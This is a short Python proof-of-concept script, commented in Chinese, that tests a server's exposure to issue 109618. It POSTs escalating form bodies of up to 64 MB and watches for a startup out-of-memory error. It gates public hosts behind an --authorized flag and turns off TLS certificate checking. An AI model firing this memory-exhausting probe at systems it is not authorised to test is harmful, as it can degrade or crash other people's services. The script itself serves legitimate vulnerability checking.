#!/usr/bin/env python3
"""109618 可达性判定：发一个中等体积表单，看是否出现"启动期 OOM"。

这是判定信号，不是利用。命中说明目标在请求初始化阶段撞上了 memory_limit，
即 109618 的入口在外部可见；没命中不代表一定安全（构建不同会让行为不同）。

用法：
  python3 poc_109618_signal.py --url http://127.0.0.1:8080/index.php --size 3
"""
from __future__ import annotations
import argparse, ipaddress, re, socket, ssl, sys
import urllib.error, urllib.parse, urllib.request

UA = "Mozilla/5.0 (compatible; 109618-signal/1.0)"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
OOM = re.compile(r"Allowed memory size of \d+ bytes exhausted.*?Unknown", re.S)

def private(host):
    try:
        for _, _, _, _, sa in socket.getaddrinfo(host, None):
            ip = ipaddress.ip_address(sa[0])
            if not (ip.is_private or ip.is_loopback or ip.is_link_local):
                return False
        return True
    except OSError:
        return False

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--size", type=float, default=3.0, help="单次请求体大小（MB）")
    ap.add_argument("--adaptive", action="store_true",
                    help="自适应：从 1MB 起按 1,2,4,8,16,32,64 递增，命中即停")
    ap.add_argument("--max-size", type=float, default=64.0, help="自适应上限（MB）")
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--timeout", type=float, default=20)
    a = ap.parse_args()

    host = urllib.parse.urlparse(a.url).hostname or ""
    if not a.authorized and not private(host):
        sys.exit(f"[!] {host} 不在私网范围；确认授权后加 --authorized")

    def one(mb: float):
        body = ("big=" + "A" * int(mb * 1024 * 1024)).encode()
        req = urllib.request.Request(a.url, data=body, method="POST", headers={
            "User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"})
        try:
            with urllib.request.urlopen(req, timeout=a.timeout, context=CTX) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception as e:
            return 0, str(e)[:80].encode()

    sizes = [1, 2, 4, 8, 16, 32, 64] if a.adaptive else [a.size]
    sizes = [x for x in sizes if x <= a.max_size]
    for mb in sizes:
        status, resp = one(mb)
        text = resp.decode("latin1", "replace")
        hit = OOM.search(text)
        print(f"[*] POST {a.url} ({mb} MB) -> {status}")
        if hit:
            print("[+] 命中启动期 OOM：")
            print("    " + hit.group(0)[:160].replace("\n", " "))
            return
        if status == 0:
            print("[-] 连接异常（可能被重置/超时），停止递增")
            return
    print("[-] 未见启动期 OOM 信号（可能已修复 / 构建不同 / post_max_size 先拦截）")

if __name__ == "__main__":
    main()
